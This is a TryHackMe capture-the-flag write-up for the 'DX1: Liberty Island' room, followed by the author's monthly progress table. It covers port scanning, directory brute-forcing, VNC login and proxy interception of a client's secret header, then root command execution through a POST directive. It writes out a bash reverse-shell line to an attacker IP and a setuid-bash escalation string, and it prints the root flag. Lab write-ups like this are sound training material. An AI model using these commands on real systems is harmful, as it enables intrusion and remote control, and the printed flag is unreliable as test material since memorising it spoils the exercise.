<h1 align="center">DX1: Liberty Island</h1>
<p align="center">2025, October 22  &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure on my <code>534</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>Can you help the NSF get a foothold in UNATCO's system? &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/dx1libertyislandplde">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/bc4f9db5-f2b4-45f0-94e6-946a192bf714"></p>

<h1>Task 1 . Introduction</h1>
<p>The NSF are about to raid Liberty Island to capture the shipment of Ambrosia from UNATCO (The United Nations Anti-Terrorist Coalition). As our top hacker, we need you to gain a root foothold on the UNATCO admin network.<br>

Warning: Don't try to brute force auth - the services in question don't like this.</p>

<p><em>Answer the questions below</em></p>


```bash
:~/DX1LibertyIsland# nmap -p- -T4 xx.xx.xx.xxx
...
Host is up (0.000093s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
5901/tcp  open  vnc-1
23023/tcp open  unknown
```

```bash
:~/DX1LibertyIsland# nmap -sC -sV -Pn -p22,80,5901,23023 -T4 xx.xx.xx.xxx
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
| http-robots.txt: 2 disallowed entries 
|_/datacubes *
|_http-title: United Nations Anti-Terrorist Coalition
5901/tcp  open  vnc-1
|_vnc-info: ERROR: Script execution failed (use -d to debug)
23023/tcp open  unknown
```

<p>
  
- The phrase <code>send a directive to process</code> suggests a command interface.<br>
- The banner <code>UNATCO Liberty Island - Command/Control</code> indicate a non-standard service worth investigating.</p>

```bash
:~/DX1LibertyIsland# rustscan -a xx.xx.xx.xxx --ulimit 5000 -b 65535 -- -A -Pn
...
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
| http-robots.txt: 2 disallowed entries 
|_/datacubes *
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: United Nations Anti-Terrorist Coalition
5901/tcp  open  vnc     syn-ack VNC (protocol 3.3; Locked out)
|_vnc-info: ERROR: Script execution failed (use -d to debug)
23023/tcp open  unknown syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Access-Control-Allow-Origin: *
|     Content-Type: text/plain
|     Date: Wed, 22 Oct 2025 xx:xx:xx GMT
|     Content-Length: 90
|     UNATCO Liberty Island - Command/Control
|     RESTRICTED: ANGEL/OA
|     send a directive to process
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Access-Control-Allow-Origin: *
|     Content-Type: text/plain
|     Date: Wed, 22 Oct 2025 xx:xx:xx GMT
|     Content-Length: 90
|     UNATCO Liberty Island - Command/Control
|     RESTRICTED: ANGEL/OA
|_    send a directive to process
```

```bash
:~/DX1LibertyIsland# nikto -h http://xx.xx.xx.xxx
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xx.xx.xxx
+ Target Hostname:    xx.xx.xx.xxx
+ Target Port:        80
+ Start Time:         2025-10-22 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x38d 0x5eba018fbc080 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-10-22 xx:xx:xx (GMT1) (8 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
:~/DX1LibertyIsland# nikto -h http://xx.xx.xx.xxx:23023
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xx.xx.xxx
+ Target Hostname:    xx.xx.xx.xxx
+ Target Port:        23023
+ Start Time:         2025-10-22 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'access-control-allow-origin' found, with contents: *
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ 6544 items checked: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2025-10-22 xx:xx:xx (GMT1) (7 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
:~/DX1LibertyIsland# ffuf -u http://xx.xx.xx.xxx/indexFUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://xx.xx.xx.xxx/indexFUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.html                   [Status: 200, Size: 909, Words: 252, Lines: 37]
:: Progress: [39/39] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

```bash
:~/DX1LibertyIsland# gobuster dir -u http://xx.xx.xx.xxx/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -x html,txt -t 60
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://xx.xx.xx.xxx/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://xx.xx.xx.xxx/.html                (Status: 403) [Size: 277]
http://xx.xx.xx.xxx/index.html           (Status: 200) [Size: 909]
http://xx.xx.xx.xxx/terrorism.html       (Status: 200) [Size: 5939]
http://xx.xx.xx.xxx/robots.txt           (Status: 200) [Size: 95]
http://xx.xx.xx.xxx/threats.html         (Status: 200) [Size: 4140]
http://xx.xx.xx.xxx/server-status        (Status: 403) [Size: 277]
Progress: 436550 / 436552 (100.00%)
===============================================================
Finished
===============================================================
```

<br>
<p>port 80</p>

<img width="1132" height="639" alt="image" src="https://github.com/user-attachments/assets/7be91478-f528-44bb-8bf6-7dc05454e2dc" />

<img width="1119" height="443" alt="image" src="https://github.com/user-attachments/assets/f342994a-6f54-40be-bb93-dcfa9c621ea5" />

<br>
<br>
<br>
<p>/robots.txt</p>

<img width="1127" height="67" alt="image" src="https://github.com/user-attachments/assets/d0a1ba86-7f71-4691-b1c2-ff41fe8a0f16" />

<br>
<br>
<br>
<p>/datacubes redirect to /datacubes/0000/</p>

<img width="1118" height="92" alt="image" src="https://github.com/user-attachments/assets/45634d8d-697a-40e0-a555-b560409d2603" />

<br>
<br>
<br>
<p>/datacubes redirect to /datacubes/0011/</p>

<img width="1050" height="198" alt="image" src="https://github.com/user-attachments/assets/43d2a2b3-b557-45b9-b6d8-3fbc0d782dc5" />

<br>
<br>
<br>
<p>/terrorism.html</p>

<img width="1128" height="513" alt="image" src="https://github.com/user-attachments/assets/6533b7d9-a74a-44d8-a303-2c1665df6c71" />

<br>
<br>
<br>
<p>/threats.html</p>

<img width="1127" height="476" alt="image" src="https://github.com/user-attachments/assets/10dfd0ac-9d31-45be-a1b7-605e7f08f341" />

<img width="1130" height="637" alt="image" src="https://github.com/user-attachments/assets/51b62440-b223-40c8-9f3f-0cadc85d3ea1" />

<br>
<br>
<br>
<p>/badactors.html</p>

<img width="819" height="808" alt="image" src="https://github.com/user-attachments/assets/7222926f-ced3-4862-927f-76170b5d3051" />

<br>
<br>
<br>
<p>/badactors.txt</p>

```bash
apriest
aquinas_nz
cookiecat
craks
curley
darkmattermatt
etodd
gfoyle
grank
gsyme
haz
hgrimaldi
hhall
hquinnzell
infosneknz
jallred
jhearst
jlebedev
jooleeah
juannsf
killer_andrew
lachland
leesh
levelbeam
mattypattatty
memn0ps
nhas
notsus
oenzian
roseycross
sjasperson
sweetcharity
tfrase
thom_seven
ttong
```

```bash
:~/DX1LibertyIsland# seq -w 0000 9999 > sequence
```

```bash
:~/DX1LibertyIsland# head -n 5 sequence
0000
0001
0002
0003
0004
```

```bash
:~/DX1LibertyIsland# gobuster dir -u http://xx.xx.xx.xxx/datacubes/ -w sequence -e -k -t 60
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://xx.xx.xx.xxx/datacubes/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                sequence
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://xx.xx.xx.xxx/datacubes/0000                 (Status: 301) [Size: 321] [--> http://xx.xx.xx.xxx/datacubes/0000/]
http://xx.xx.xx.xxx/datacubes/0068                 (Status: 301) [Size: 321] [--> http://xx.xx.xx.xxx/datacubes/0068/]
http://xx.xx.xx.xxx/datacubes/0011                 (Status: 301) [Size: 321] [--> http://xx.xx.xx.xxx/datacubes/0011/]
http://xx.xx.xx.xxx/datacubes/0103                 (Status: 301) [Size: 321] [--> http://xx.xx.xx.xxx/datacubes/0103/]
http://xx.xx.xx.xxx/datacubes/0233                 (Status: 301) [Size: 321] [--> http://xx.xx.xx.xxx/datacubes/0233/]
http://xx.xx.xx.xxx/datacubes/0451                 (Status: 301) [Size: 321] [--> http://xx.xx.xx.xxx/datacubes/0451/]
Progress: 10000 / 10001 (99.99%)
===============================================================
Finished
===============================================================
```

<br>
<br>
<br>
<p>/datacubes/0011</p>

<img width="1060" height="670" alt="image" src="https://github.com/user-attachments/assets/98485c8a-ab49-4410-9912-45cb986862f3" />

<br>
<br>
<br>
<p>/datacubes/0068</p>

<img width="1055" height="785" alt="image" src="https://github.com/user-attachments/assets/21df4460-6d88-4f05-8a1b-17064d856d85" />

<br>
<br>
<br>
<p>/datacubes/0103</p>

<img width="1052" height="152" alt="image" src="https://github.com/user-attachments/assets/698ce6e2-ce24-40f3-864e-007315e8bccd" />

<br>
<br>
<br>
<p>/datacubes/0233</p>

<img width="1051" height="109" alt="image" src="https://github.com/user-attachments/assets/2e54ee3b-33d4-4dfc-be6f-36744f4b2867" />

<br>
<br>
<br>
<p>/datacubes/0451<br>smashthestate</p>

<img width="1047" height="121" alt="image" src="https://github.com/user-attachments/assets/f0ad61f9-aeff-4ed2-9aa2-4c6f3f2580ee" />

<br>
<br>
<br>
<p>badactor<br>
jlebedev</p>

<img width="1048" height="55" alt="image" src="https://github.com/user-attachments/assets/38bfc71b-3d17-4e64-91f0-bd8312efed5f" />

<br>
<br>
<br>
<p>badactor<br>
<strong>311781a1</strong> are the first 8 characters of the MD5 hash <strong>311781a1</strong>830c1332a903920a59eb6d7a</p>

<img width="1352" height="201" alt="image" src="https://github.com/user-attachments/assets/52972106-ed12-444c-8e23-a9e66231c491" />

<p>Remmina</p>

<img width="473" height="99" alt="image" src="https://github.com/user-attachments/assets/cb9da05a-701d-48bf-b299-3c4adb8d497f" />

<br>
<br>
<br>

<img width="1028" height="642" alt="image" src="https://github.com/user-attachments/assets/ccdc59ad-dff6-47e1-929c-0595cf5c0516" />

<br>
<br>
<br>

<img width="1020" height="549" alt="image" src="https://github.com/user-attachments/assets/8d9d5f3c-80b0-4084-9d0f-ff52f9125877" />

<br>
<br>
<br>
<p>Terminal</p>

<img width="633" height="393" alt="image" src="https://github.com/user-attachments/assets/ee6777a4-0403-4261-ab55-68ca8e5fe280" />

<br>
<br>
<br>

```bash
C:\home\ajacobson\Desktop> file badactors-list
badactors-list: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c9bf588974cd2b3b7c2db34d49d3df7aec3a76dc, for GNU/Linux 3.2.0, not stripped
```

```bash
C:\home\ajacobson\Desktop> echo 'bash -i >& /dev/tcp/xx.xx.xxx.xxx/9001 0>&1' > /tmp/rev.sh
C:\home\ajacobson\Desktop> chmod +x /tmp/rev.sh
```

<img width="1030" height="496" alt="image" src="https://github.com/user-attachments/assets/15f4b771-b05a-4e92-a007-3e6133647be2" />

<br>
<br>
<br>

<img width="1035" height="424" alt="image" src="https://github.com/user-attachments/assets/984b0a60-4557-498d-857f-3889755b6f32" />


```bash
C:\home\ajacobson\Desktop> ls
badactors-list  user.txt
```

```bash
C:\home\ajacobson\Desktop> python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
:~/DX1LibertyIsland# wget http://xx.xx.xx.xxx:8000/badactors-list
```

```bash
C:\home\ajacobson\Desktop> python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xx.xx.xxx- - [22/Oct/2025 xx:xx:xx] "GET /badactors-list HTTP/1.1" 200 -
```

```bash
xx.xx.xx.xxx  UNATCO
```

<p>unatco:23023</p>

<img width="1226" height="188" alt="image" src="https://github.com/user-attachments/assets/92927a18-a08d-4cbd-b07a-6a0a244bcfb3" />

<br>
<br>
<br>

```bash
UNATCO Liberty Island - Command/Control

RESTRICTED: ANGEL/OA

send a directive to process
```

```bash
C:\home\ajacobson\Desktop> export http_proxy=xx.xx.xxx.xxx:1337
C:\home\ajacobson\Desktop> ./badactors-list
Overriding existing handler for signal 10. Set JSC_SIGNAL_FOR_GC if you want WebKit to use a different signal
```

```bash
:~/DX1LibertyIsland# nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on xx.xx.xx.xxx 45614
POST http://UNATCO:23023/ HTTP/1.1
Host: UNATCO:23023
User-Agent: Go-http-client/1.1
Content-Length: 49
Clearance-Code: ••••••••••••••••••••
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

directive=cat+%2Fvar%2Fwww%2Fhtml%2Fbadactors.txt
```

```bash
:~/DX1LibertyIsland# curl -X POST -H 'Clearance-Code: ••••••••••••••••••••' -d 'directive=cat+/root/root.txt' unatco:23023

From: AJacobson//UNATCO.00013.76490
To: JCDenton//UNATCO.82098.9868
Subject: Come by my office

We need to talk about that last mission.  In person, not infolink.  Come by my
office after you've been debriefed by Manderley.

    thm{*******************************}

-alex-
```

<img width="1190" height="183" alt="image" src="https://github.com/user-attachments/assets/8d2588d6-8fab-4c74-b378-e05fd856f2fb" />


<br>
<br>
<br>
<p>1.1. What is the User flag? Hint: <em>If you get locked out, restart either the target or your attack box for a new IP.</em><br>
<code>thm{********************************}</code></p>

<br>
<p>1.2. What is the Root flag?<br>
<code>thm{985bb3c88bfe66f9b465b00198692866}</code></p>

<h1>Task 2 . Credits</h1>
The theme used for XFCE is https://github.com/grassmunk/Chicago95 which is excellent! Thanks to my beta testers (Voy, memN0ps and sootierr). Thanks to https://nuwen.net/dx.html a compiled Deus Ex text resource by the excellent Stephan T. Lavavej. And thanks to all of you!

<p><em>Answer the question below</em></p>

<br>
<p>2.1. Thanks!</em><br>
<code>No answer needed</code></p>

<br>
<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/5429f763-3dc1-4162-bd6e-edd24f4a0712"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/01ff3429-881d-4fa6-945f-2277fb32ff92"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, October</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|22      |Medium 🚩 - DX1: Liberty Island        | 534    |      87ᵗʰ    |      4ᵗʰ     |      88ᵗʰ    |     2ⁿᵈ    | 131,925  |  1,014    |    79     |
|22      |Medium 🔗 - Alert Tryage With Splunk   | 534    |      87ᵗʰ    |      4ᵗʰ     |      89ᵗʰ    |     2ⁿᵈ    | 131,865  |  1,013    |    79     |
|21      |Easy 🔗 - Cyber Scotland 2021          | 533    |      87ᵗʰ    |      4ᵗʰ     |      87ᵗʰ    |     2ⁿᵈ    | 131,777  |  1,012    |    79     |
|21      |Medium 🔗 - Windows PrivEsc            | 533    |      87ᵗʰ    |      4ᵗʰ     |      88ᵗʰ    |     2ⁿᵈ    | 131,737  |  1,011    |    79     |
|20      |Hard 🚩 - Enterprise                   | 532    |      87ᵗʰ    |      4ᵗʰ     |      81ˢᵗ    |     2ⁿᵈ    | 131,729  |  1,010    |    79     |
|19      |Hard 🚩 - Misguided Ghosts             | 531    |      87ᵗʰ    |      4ᵗʰ     |      77ᵗʰ    |     2ⁿᵈ    | 131,661  |  1,009    |    79     |
|18      |Hard 🚩 - Year of the Pig              | 530    |      89ᵗʰ    |      4ᵗʰ     |      72ⁿᵈ    |     2ⁿᵈ    | 131,531  |  1,008    |    79     |
|18      |Easy 🚩 - The Phishing Pond            | 530    |      90ᵗʰ    |      4ᵗʰ     |      74ᵗʰ    |     2ⁿᵈ    | 131,501  |  1,007    |    79     |
|17      |Hard 🚩 - Initial Access Pot           | 529    |      90ᵗʰ    |      4ᵗʰ     |      68ᵗʰ    |     2ⁿᵈ    | 131,456  |  1,006    |    79     |
|17      |Medium 🔗 - AllSignsPoint2Pwnage       | 529    |      90ᵗʰ    |      4ᵗʰ     |      87ᵗʰ    |     2ⁿᵈ    | 131,186  |  1,005    |    79     |
|16      |Easy 🔗 - Network Traffic Basics       | 528    |      90ᵗʰ    |      4ᵗʰ     |      89ᵗʰ    |     2ⁿᵈ    | 131,138  |  1,004    |    79     |
|16      |Medium 🔗 - Linux Threat Detection 3   | 528    |      90ᵗʰ    |      4ᵗʰ     |      89ᵗʰ    |     2ⁿᵈ    | 131,066  |  1,003    |    79     |
|13      |Hard 🚩 - M4tr1x: Exit Denied          | 525    |      92ⁿᵈ    |      4ᵗʰ     |      76ᵗʰ    |     2ⁿᵈ    | 130,938  |  1,002    |    79     |
|12      |Easy 🔗 - Atlas                        | 524    |     101ˢᵗ    |      4ᵗʰ     |     251ˢᵗ    |     3ʳᵈ    | 129,902  |  1,001    |    76     |
|11      |Easy 🔗 - Brute Force Heroes           | 523    |     101ˢᵗ    |      4ᵗʰ     |     217ᵗʰ    |     3ʳᵈ    | 129,878  |  1,000    |    76     |
|11      |Hard 🚩 - Rocket                       | 523    |     102ⁿᵈ    |      4ᵗʰ     |     211ˢᵗ    |     3ʳᵈ    | 129,870  |    999    |    76     |
|10      |Easy 🚩 - Shadow Trace                 | 522    |     101ˢᵗ    |      4ᵗʰ     |     159ᵗʰ    |     3ʳᵈ    | 129,810  |    998    |    76     |
|10      |Easy 🔗 - Defensive Security Intro     | 522    |     103ʳᵈ    |      4ᵗʰ     |     357ᵗʰ    |     3ʳᵈ    | 129,405  |    997    |    76     |
|10      |Easy 🔗 - 25 Days of Cyber Security, Day 2| 522|      103ʳᵈ    |      4ᵗʰ     |     355ᵗʰ    |     3ʳᵈ    | 129,405  |    996    |    76     |
|9       |Medium 🔗 - Linux Threat Detection 2   | 521    |     103ʳᵈ    |      4ᵗʰ     |     326ᵗʰ    |     3ʳᵈ    | 129,373  |    996    |    76     |
|9       |Medium 🚩 - WWBuddy                    | 521    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,293  |    995    |    76     |
|8       |Hard 🚩 - Motunui                      | 520    |     103ʳᵈ    |      4ᵗʰ     |     383ʳᵈ    |     4ᵗʰ    | 129,201  |    994    |    76     |
|8       |Easy 🔗 - Man-in-the-Middle            | 520    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,141  |    993    |    76     |
|7       |Medium 🚩 - Profiles, in progress      | 519    |              |              |              |            | 129,021  |    992    |    76     |
|6       |Medium 🚩 - VulnNet                    | 518    |     105ᵗʰ    |      4ᵗʰ     |     348ᵗʰ    |     5ᵗʰ    | 129,021  |    992    |    76     |
|6       |Easy 🚩 - DearQA                       | 518    |     105ᵗʰ    |      4ᵗʰ     |     333ʳᵈ    |     6ᵗʰ    | 128,991  |    991    |    76     |
|5       |Medium 🚩 - Frank & Herby try again.....| 517   |     106ᵗʰ    |      4ᵗʰ     |     300ᵗʰ    |     5ᵗʰ    | 128,931  |    990    |    76     |
|4       |Medium 🚩 - Frank & Herby make an app  | 516    |     105ᵗʰ    |      4ᵗʰ     |     233ʳᵈ    |     3ʳᵈ    | 128,871  |    989    |    76     |
|4       |Info ℹ️ - OverlayFS - CVE-2021-3493    | 516    |     105ᵗʰ    |      4ᵗʰ     |     235ᵗʰ    |     3ʳᵈ    | 128,841  |    988    |    76     |
|3       |Medium 🚩 - XDR: Operation Global Dagger2| 515  |     104ᵗʰ    |      4ᵗʰ     |     149ᵗʰ    |     3ʳᵈ    | 128,833  |    987    |    76     |
|3       |Medium 🚩 - VulnNet: dotpy             | 515    |     108ᵗʰ    |      4ᵗʰ     |     741ˢᵗ    |    11ˢᵗ    | 128,563  |    986    |    76     |
|2       |Medium 🔗 - Data Exfiltration Detection| 514    |     108ᵗʰ    |      4ᵗʰ     |     521ˢᵗ    |     8ᵗʰ    | 128,503  |    985    |    76     |
|1       |Medium 🔗 - Network Discovery Detection| 513    |     108ᵗʰ    |      4ᵗʰ     |     875ᵗʰ    |     7ᵗʰ    | 128,407  |    984    |    76     |
|1       |Medium 🚩 - Intranet                   | 513    |     108ᵗʰ    |      4ᵗʰ     |    3,357ᵗʰ   |    57ᵗʰ    | 128,335  |    983    |    76     |

</h6></div>

<br>


<p align="center">Global All Time:    87ᵗʰ<br><img width="250px"  src="https://github.com/user-attachments/assets/7f7aa060-bf5b-4b96-81a1-47d7de379df0"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/0424d1a9-9722-442b-8325-f9a6848eb901"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/a77ccac1-602d-4323-bb57-fe0bc7d8bbde"><br>
                  Global monthly:     89ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/acf34500-134a-44fd-8ceb-23236413c1e3"><br>
                  Brazil monthly:      2ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/d136c41b-ae85-4038-addd-b8f827b1449c"></p>


<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>

<br>
<br>
<br>
<br>
<br>
<br>
<p>Other actions performed before finding the correct path.</p>

```bash
:~/DX1LibertyIsland# strings badactors-list > stringsss
```

```bash
:~/DX1LibertyIsland# grep -E /var/www stringsss
```

<img width="1304" height="460" alt="image" src="https://github.com/user-attachments/assets/d13321f3-ba43-4b9c-a158-b73ff92bc71f" />

<img width="1302" height="360" alt="image" src="https://github.com/user-attachments/assets/cde8d7b5-512b-4d73-b94b-f06a48cc3bf6" />

```bash
C:\home\ajacobson\Desktop> cd /tmp
```

```bash
C:\tmp> wget http://xx.xx.xxx.xxx:8000/badactors-list
--2025-10-22 xx:xx:xx--  http://xx.xx.xxx.xxx:8000/badactors-list
Connecting to xx.xx.xxx.xxx:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4836 (4.7K) [application/octet-stream]
Saving to: \u2018badactors-list\u2019

badactors-list      100%[===================>]   4.72K  --.-KB/s    in 0s      

2025-10-22 xx:xx:xx (172 MB/s) - \u2018badactors-list\u2019 saved [4836/4836]

C:\tmp>
```

```bash
C:\tmp> chmod 777 badactors-list
```

```bash
C:\tmp> ls
badactors-list
pulse-PKdhtXMmr18n
rev.sh
...
```

```bash
.lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625CLIENT_HANDSHAKE_TRAFFIC_SECRETNetwork Authentication RequiredPRIORITY frame with stream ID 0Request Header Fields Too LargeRequested Range Not SatisfiableSERVER_HANDSHAKE_TRAFFIC_SECRETSIGSEGV: segmentation violationTLS: sequence number wraparoundbad certificate status responsebad write barrier buffer boundscall from within the Go runtimecannot assign requested addresscasgstatus: bad incoming valuescat /var/www/html/badactors.txtcheckmark found unmarked objectentersyscallblock inconsistent fatal: bad g in signal handler
runtime: text offset base pointer out of rangeruntime: type offset base pointer out of rangeslice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to pallocChunkBytestls: failed to parse certificate from server: tls: received new session ticket from a clienttls: server chose an unconfigured cipher suitetls: server did not echo the legacy session IDx509: failed to parse rfc822Name constraint %qx509: failed to unmarshal elliptic curve pointx509: malformed signature algorithm identifier (temporarily override with GODEBUG=x509sha1=1)1xx informational response with END_STREAM flagP has cached GC work at end of mark terminationasn1: Unmarshal recipient value is non-pointer attempting to link in too many shared librariesbufio: reader returned negative count from Readchacha20poly1305: message authentication failedcurve25519: global Basepoint value was modifiedexplicit string type given to non-string memberfirst record does not look like a TLS handshakefunction symbol table not sorted by PC offset: http: server gave HTTP response to HTTPS clientprotocol error: received DATA on a HEAD requestracy sudog adjustment due to parking on channelreflect: CallSlice with too few input argumentsregister-based return value has stack componentslice bounds out of range [::%x] with length %ytls: incorrect renegotiation extension contentstls: internal error: pskBinders length mismatchtls: server selected TLS 1.3 in a renegotiationtls: server selected unadvertised ALPN protocoltls: server sent two HelloRetryRequest messagesx509: internal error: IP SAN %x failed to parsex509: malformed public key algorithm identifierTime.MarshalJSON: year outside of range [0,9999]Time.MarshalText: year outside of range [0,9999]bufio: writer returned negative count from Writecrypto/elliptic: failed to generate random pointfailed to parse certificate #%d in the chain: %wnot enough significant bits after mult64bitPow10out points to big.Int, but defaultValue does notparsing/packing of this type isn't available yetreflect: CallSlice with too many input argumentsruntime: cannot map pages in arena address spaceslice bounds out of range [:%x] with capacity %ystrconv: illegal AppendFloat/FormatFloat bitSizetls: CloseWrite called before handshake completetls: CurvePreferences includes unsupported curvex509: IP constraint contained value of length %dx509: SAN uniformResourceIdentifier is malformedx509: internal error: URI SAN %q failed to parsex509: internal error: cannot parse constraint %q (Client.Timeout exceeded while awaiting headers)/etc/pki/ca-trust/extracted/pem/tls-ca-bundle.pemcasgstatus: waiting for Gwaiting but is Grunnablechacha20poly1305: bad nonce length passed to Openchacha20poly1305: bad nonce length passed to Sealcrypto/tls: ExportKeyingMaterial context too longdelayed zeroing on data that may contain pointersecho %s | cp /bin/bash /tmp/w  && chmod +s /tmp/wfully empty unfreed span set block found in resetfunction may only return a value or a value+errorhttp2: request body closed due to handler exitinghttp: wrote more than the declared Content-Lengthinvalid memory address or nil pointer dereferenceinvalid or incomplete multibyte or wide characternet/http: Transport.Dial hook returned (nil, nil)not enough significant bits after mult128bitPow10panicwrap: unexpected string after package name: reflect.Value.Slice: slice of unaddressable arrayruntime.reflect_makemap: unsupported map key types.allocCount != s.nelems && freeIndex == s.nelemsslice bounds out of range [::%x] with capacity %ystrings.Reader.UnreadByte: at beginning of stringstrings.Reader.WriteTo: invalid WriteString countsweeper left outstanding across sweep generationstls: server advertised unrequested ALPN extensiontls: server sent a cookie in a normal ServerHellox509: Ed25519 key encoded with illegal parametersx509: invalid RDNSequence: invalid attribute typeattempt to execute system stack code on user stackchacha20: SetCounter attempted to rollback countercrypto/cipher: incorrect nonce length given to GCMcryptobyte: attempted write while child is pendingedwards25519: invalid SetUniformBytes input lengthgo package net: dynamic selection of DNS resolver
```

```bash
:~/DX1LibertyIsland# python3
Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.

>>> len("base64 -d > /var/www/html/badactors.txt")
39
>>> len("cp /bin/bash /tmp/w  && chmod +s /tmp/w")
39
>>> 
```

```bash
:~/DX1LibertyIsland# ./badactors-list
Overriding existing handler for signal 10. Set JSC_SIGNAL_FOR_GC if you want WebKit to use a different signal
```

<img width="240" height="287" alt="image" src="https://github.com/user-attachments/assets/3804df04-86f2-423a-bfc7-713c8e876433" />


```bash
:~/DX1LibertyIsland# nc -nlvp 9001
Listening on 0.0.0.0 9001
```

<img width="1029" height="377" alt="image" src="https://github.com/user-attachments/assets/cf22485a-0a6b-447e-ae35-a367f511a95e" />
